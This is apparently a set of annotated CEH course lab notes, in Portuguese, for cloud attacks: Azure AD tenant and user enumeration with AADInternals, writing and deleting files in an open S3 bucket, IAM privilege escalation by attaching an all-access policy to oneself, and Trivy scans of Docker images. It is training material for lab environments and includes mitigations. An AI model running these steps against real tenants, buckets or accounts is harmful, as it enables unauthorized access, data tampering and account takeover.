#!/bin/bash



###############
# MOD 19 - Lab 1: Perform Reconnaissance on Azure
###############

########
# TASK 1: Azure reconnaissance with AADInternals
########

# Objetivo: 
#   Realizar reconhecimento (reconnaissance) externo contra o Azure Active Directory (AAD) de uma organização alvo, usando PowerShell e o módulo AADInternals.

# Ferramentas e Sites Utilizados
#   PowerShell	                        Terminal para execução dos módulos e comandos
#   AADInternals	                    Módulo PowerShell para recon de Azure AD
#   https://aadinternals.com/osint/	    Ferramenta web para consultar informações de tenants
#   users.txt	                        Lista de possíveis emails para enumeração


# Acesso ao Ambiente
#   Login:
#       Usuário: Admin
#       Senha: Pa$$w0rd
#   Tornar máquina "descoberta" na rede → clicar Yes.

# Preparar Ambiente PowerShell
#   Copiar ferramenta:
#       Navegar até:
E:\CEH-Tools\CEHv13 Module 19 Cloud Computing\GitHub Tools\
#   Copiar pasta AADInternals para a Área de Trabalho (Desktop).
#   Abrir PowerShell como Administrador:
#       Digitar powershell na busca do Windows.
#       Clicar com botão direito → "Executar como Administrador".
#       Aceitar o UAC se solicitado.

# Navegar até o Diretório AADInternals
cd C:\Users\Admin\Desktop\AADInternals

# Instalar e Importar o Módulo AADInternals
#   Instalar:
Install-Module AADInternals
#   Respostas esperadas:
#       Deseja instalar o NuGet? → Y
#       Confiar na fonte PSGallery? → A
#   Importar:
Import-Module AADInternals

# Coletar Informações Públicas do Azure AD
#   Obter informações do Tenant (externo):
Invoke-AADIntReconAsOutsider -DomainName eccouncil.org | Format-Table
#   Coleta:
#       Nome do Tenant
#       ID do Tenant
#       Domínios verificados
#       DNS, SPF, DKIM, DMARC

# Enumeração de Usuários
#   Verificar se um usuário existe:
Invoke-AADIntUserEnumerationAsOutsider -UserName fulano@eccouncil.org
#   Se retornar Exists: True, o usuário existe.
#   Enumeração em massa via lista:
#       Criar arquivo users.txt com emails.
#       Executar:
Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider -Method Normal

# Obter Informações de Login
#   Para um domínio:
Get-AADIntLoginInformation -Domain eccouncil.org
#   Para um usuário:
Get-AADIntLoginInformation -Domain fulano@eccouncil.org

# Obter ID do Tenant
Get-AADIntTenantID -Domain eccouncil.org
#   Retorna o Tenant ID único da organização no Azure AD.

# Obter todos os domínios registrados no Tenant
Get-AADIntTenantDomains -Domain eccouncil.org
#   Mostra todos os domínios associados ao mesmo Tenant (ex: *.eccouncil.org, eccouncil.net...).

# Alternativa via Site Web
#   Acessar:
https://aadinternals.com/osint/
#   Inserir:
#       Domain name ou
#       Tenant ID ou
#       Email
#   Exemplo de uso:
#       Pesquisar: eccouncil.org
#       Resultado: Tenant Name, Tenant ID, Verified Domains, DNS Records (SPF, DMARC...), etc.

# Checklist das Técnicas Usadas
#   Acesso e execução de PowerShell
#   Instalação de módulo externo (AADInternals)
#   Enumeração de domínio (tenant)
#   Enumeração de usuários
#   Obtenção de ID de Tenant
#   Obtenção de domínios associados
#   Busca via site OSINT externo

# Informações Obtidas com o Reconhecimento
#   Tenant ID	    2e55c3a6-xxxx-xxxx-xxxx-xxxxxx
#   Tenant Name	EC-Council Organization
#   Emails existentes	john.doe@eccouncil.org
#   Domínios verificados	eccouncil.org, eccouncil.net, etc
#   Login URLs	login.microsoftonline.com/...
#   Protocolos de autenticação	ADFS, Azure AD, etc
#   Registros DNS	SPF, DKIM, DMARC, MX


###############
# MOD 19 - Lab 2: Exploit S3 buckets
###############

########
# TASK 1: Exploit open S3 buckets using AWS CLI
########

# Objetivo:
#   Demonstrar como explorar buckets S3 públicos e mal configurados, utilizando o terminal e o AWS CLI, com ações como:
#       Listar arquivos públicos
#       Inserir arquivos maliciosos
#       Deletar arquivos remotamente
#       Verificar configurações de acesso

# Ferramentas e Recursos Utilizados
#   Parrot Security OS	        Ambiente Linux para pentest
#   Terminal (MATE Terminal)	Execução dos comandos
#   AWS CLI	                    Interface de linha de comando para interagir com a AWS
#   Navegador Firefox	        Acesso ao Console AWS (https://console.aws.amazon.com)
#   Amazon S3	                Serviço de armazenamento de objetos da AWS
#   Hack.txt	                Arquivo usado como payload de exemplo

Acesso como root (modo administrador)
sudo su
# Senha: toor
# Ir para diretório home do root
cd

# Instalar o AWS CLI via pip3
pip3 install awscli

# Configurar o AWS CLI
aws configure
#   O terminal pedirá as seguintes informações:
#       AWS Access Key ID → Obtido no Console AWS
#       AWS Secret Access Key → Obtido no Console AWS
#       Default region name → Ex: eu-west-1
#       Default output format → Pressione Enter para deixar em branco (JSON por padrão)

# Acessar Console AWS (navegador)
#   Acessar:
https://console.aws.amazon.com
#   Ir para:
#       [Perfil de usuário > Security Credentials]
#       Access Keys > Create Access Key
#       Copiar Access Key ID e Secret Access Key
#   Esses dados são usados no aws configure.

# Listar conteúdo de bucket público
aws s3 ls s3://certifiedhacker02
#   Resultado: Lista os diretórios e arquivos disponíveis no bucket.

# Ver conteúdo no navegador (modo visual)
certifiedhacker02.s3.amazonaws.com
#   Exibe os arquivos diretamente pelo navegador, caso o bucket esteja com acesso público.

# Criar arquivo local para teste de upload
echo "You have been hacked" >> Hack.txt
#   Cria o arquivo Hack.txt com conteúdo malicioso (simulado).

# Mover o arquivo para o bucket S3
aws s3 mv Hack.txt s3://certifiedhacker02
#   Resultado: Upload do arquivo para o bucket S3 (caso permissões estejam abertas).

#  Verificar upload no navegador
#   Atualizar:
certifiedhacker02.s3.amazonaws.com
#   Verifica se o Hack.txt apareceu no bucket.

#  Deletar o arquivo do bucket
aws s3 rm s3://certifiedhacker02/Hack.txt
#   Resultado: O arquivo é deletado remotamente, confirmando permissões abertas para escrita e remoção.

# Técnicas de Enumeração de S3 Buckets (Teoria Complementar)
#   Inspeção de HTML	            Buscar URLs S3 em <script>, <img src>, etc.
#   Fuzzing/Brute Force de URL	    Usar ferramentas (ex: Burp, Gobuster) para descobrir buckets existentes via nomes
#   Subdomain Enumeration	        Usar tools como FindSubdomains, Sublist3r, Robtex
#   Reverse IP Lookup	            Buscar quais domínios compartilham o mesmo IP
#   Google Dorking	                Ex: inurl:s3.amazonaws.com confidential, site:s3.amazonaws.com ext:pdf

# Exemplo de Exploração Real de S3 (Simulada)
#   Bucket "certifiedhacker02" é público
#   Você visualiza e acessa arquivos (leitura)
#   Você envia arquivo malicioso "Hack.txt" (escrita)
#   Você deleta arquivos remotamente (delete)
#   Isso demonstra exposição completa (RWX) do bucket — falha de configuração grave.

# Recomendações para Mitigação (Bônus)
#   Desabilitar acesso público	            Evita leitura/escrita por qualquer usuário
#   Políticas de Bucket	                    Aplicar regras via IAM e Bucket Policy
#   Monitoramento com AWS CloudTrail	    Detectar atividades suspeitas
#   Escaneamento frequente	                Usar ferramentas como ScoutSuite, Prowler
#   Testes contínuos	                    Pentests regulares para checar configurações

# Conclusão do Lab
#   Este laboratório demonstrou como:
#       Configurar o AWS CLI
#       Explorar um bucket S3 público
#       Fazer upload e exclusão de arquivos
#       Analisar falhas graves de configuração

###############
# MOD 19 - Lab 3: Perform privilege escalation to gain higher privileges
###############

########
# TASK 1: Escalate IAM user privileges by exploiting misconfigured user policy
########

# Objetivo
#   Você parte de um usuário IAM com permissões limitadas, mas que tem acesso a comandos críticos (iam:AttachUserPolicy, iam:ListRoles, sts:AssumeRole, etc.)
#   Criar e anexa uma política administrativa a si mesmo, conseguindo controle total da conta.

# Criação do Arquivo JSON da Política
vim user-policy.json
#       Abre o editor Vim para criar um arquivo contendo a política que será anexada ao usuário.
#       Dentro do arquivo, você escreve uma política com acesso total (Action: *, Resource: *).
#   Conteúdo da Política:
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
#   Finalize com:
Esc
:wq! # salva e sai

# Criação da Política na AWS
aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json
#   Cria uma política no IAM baseada no arquivo local.
#       Retorna informações importantes como:
#           PolicyArn
#           PolicyId
#           PolicyName
#   Erro comum: Se a política já existe, altere o nome (--policy-name outro-nome) e tente novamente.

# Anexar a Política ao Usuário
aws iam attach-user-policy --user-name test --policy-arn arn:aws:iam::[AccountID]:policy/user-policy
#   --user-name: nome do usuário que vai receber os privilégios (ex: test)
#   --policy-arn: ARN da política criada anteriormente
#   Isso efetivamente dá permissão total de administrador ao usuário!

# Verificar as Políticas Anexadas
aws iam list-attached-user-policies --user-name test
#   Mostra todas as políticas associadas ao usuário.
#   Confirma se user-policy foi anexada com sucesso.

# Listar Usuários IAM
aws iam list-users
#   Após escalar privilégios, você pode listar todos os usuários da conta AWS.
#   Útil para mapeamento de contas internas.

# Comandos Adicionais Importantes
#   Listar buckets S3:
aws s3api list-buckets --query "Buckets[].Name"
#   Listar políticas do usuário atual:
aws iam list-user-policies --user-name test
#   Listar políticas de um papel (role):
aws iam list-role-policies --role-name [role-name]
#   Listar políticas de grupos:
aws iam list-group-policies --group-name [group-name]
#   Criar um novo usuário:
aws iam create-user --user-name new-user
#   Permissões Usadas no IAM para a Escalada

# A política inicial concedida ao usuário test contém as seguintes permissões (essenciais para o ataque):
#   Permite anexar políticas a si mesmo ou a outros usuários
iam:AttachUserPolicy	
#   Permite ver quais políticas estão anexadas
iam:ListUserPolicies	
#   Ajuda a descobrir roles que podem ser assumidos (para futuras escaladas)
iam:ListRoles	
#   Pode permitir assumir papéis com privilégios mais altos (caso existam)
sts:AssumeRole	

# O Que Isso Mostra em um Pentest
#   Esse lab demonstra um erro comum e crítico de segurança em ambientes AWS:
#       Permitir que usuários com baixos privilégios anexem políticas ou assumam papéis com permissões amplas pode resultar em acesso administrativo total.


###############
# MOD 19 - Lab 4: Perform vulnerability assessment on Docker images
###############

########
# TASK 1: Vulnerability assessment on Docker images using Trivy
########

# Objetivo
#   Realizar análise de vulnerabilidades em imagens Docker (containers) utilizando o scanner Trivy, avaliando:
#       Imagem segura: ubuntu:latest
#       Imagem vulnerável: nginx:1.19.6

# Visão Geral das Ações Realizadas
#   Acesso como root
#   Instalação de imagens Docker (ubuntu, nginx:1.19.6)
#   Escaneamento das imagens com Trivy
#   Interpretação dos resultados (CVEs, níveis de severidade, pacotes afetados)
#   Encerramento e documentação

# Acessar o terminal como root
sudo su
#   senha: toor
#   Garante permissões administrativas para executar Docker e Trivy corretamente.

# Baixar imagem segura do Docker (Ubuntu)
docker pull ubuntu
#   Baixa a imagem ubuntu:latest da Docker Hub.
#   Utilizada como referência de imagem segura.

# Scan de vulnerabilidades com Trivy na imagem Ubuntu
trivy image ubuntu
#   Analisa a imagem ubuntu em busca de:
#       Pacotes com CVEs
#       Configurações inseguras
#       Dependências vulneráveis
#   Resultado esperado:
Total: 0 vulnerabilities
#   Indica que a imagem está limpa no momento do escaneamento.

# Baixar imagem vulnerável do Docker (nginx 1.19.6)
docker pull nginx:1.19.6
#   Baixa uma versão deliberadamente vulnerável do servidor nginx.
#   Componente com histórico de falhas conhecidas.

# Scan de vulnerabilidades com Trivy na imagem nginx:1.19.6
trivy image nginx:1.19.6
#   Trivy realiza uma varredura completa na imagem, listando:
#       Nome do pacote vulnerável
#       Versão instalada
#       Versão segura (caso exista)
#       CVE relacionado
#       Nível de severidade (LOW, MEDIUM, HIGH, CRITICAL)
#       Link para mais detalhes
#   Resultado esperado:
401 vulnerabilities found
#   Exemplo de saída:
Total: 401 vulnerabilities
High: 120
Medium: 180
Low: 100
Critical: 1

# O que é Trivy?
#   Trivy (de "triage vulnerability") é um scanner de segurança para:
#       Imagens Docker
#       Repositórios de código
#       Arquivos de configuração (IaC - Terraform, Kubernetes YAML)
#       Repositórios Git e S3 buckets
#   Ele identifica:
#       Vulnerabilidades (CVEs)
#       Misconfigurações
#       Segredos expostos
#       Problemas de compliance (como CIS benchmarks)

# Conceitos Técnicos Envolvidos
#   Docker Image	                Pacote leve com app, dependências, libs, configs
#   CVE (Common Vulnerabilities)	Vulnerabilidades identificadas publicamente com código e descrição
#   Trivy Severity Levels	        LOW, MEDIUM, HIGH, CRITICAL – baseado na gravidade do problema
#   Base Image	                    Imagem original da qual outras são derivadas (ex: ubuntu, alpine)
#   Patch disponível	            Versão segura da lib que corrige a vulnerabilidade

# Possível uso dos resultados num Pentest
#   Ao encontrar vulnerabilidades em uma imagem Docker usada pela empresa, você pode:
#       Mapear CVEs críticos (com acesso remoto, execução de código, privilege escalation)
#       Criar exploit chains com base em libs vulneráveis
#       Utilizar imagens corrompidas para implantar backdoors
#       Propor mitigação (atualização, uso de imagens seguras)
